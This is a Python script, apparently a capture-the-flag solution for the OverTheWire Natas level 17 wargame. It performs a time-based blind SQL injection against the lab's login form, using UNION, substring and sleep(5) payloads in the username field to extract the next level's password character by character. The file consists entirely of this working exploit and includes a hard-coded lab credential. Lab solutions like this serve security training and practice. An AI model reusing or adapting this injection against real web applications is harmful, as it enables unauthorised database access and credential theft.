import requests
import time

url = 'http://natas17.natas.labs.overthewire.org/index.php'
username = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

data = {}
senha = str()

letras = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

for d in range(1, 33):
    print(f"{d} of 32")
    for c in range(len(letras)):
        
        if d == 1:
            data['username'] = '" UNION ALL SELECT 1,2 FROM users WHERE username = "natas18" AND substring(password,{},1) = BINARY "{}" AND sleep(5);#" '.format(d,letras[c])
        else:
            data['username'] = string + ' AND substring(password,{},1) = BINARY "{}" AND sleep(5);#"'.format(d,letras[c]) 
        
        start_time = time.time()
        response = requests.post(url=url,auth=(username, password),data=data)
        end_time = time.time()
        response_time = end_time - start_time
        print(data['username'])
        if response_time > 5:
            string = data['username'].split('AND sleep(5);#')[0]
            print(letras[c])
            senha += letras[c] 
            break

print("Progress: 100%")
print(senha)
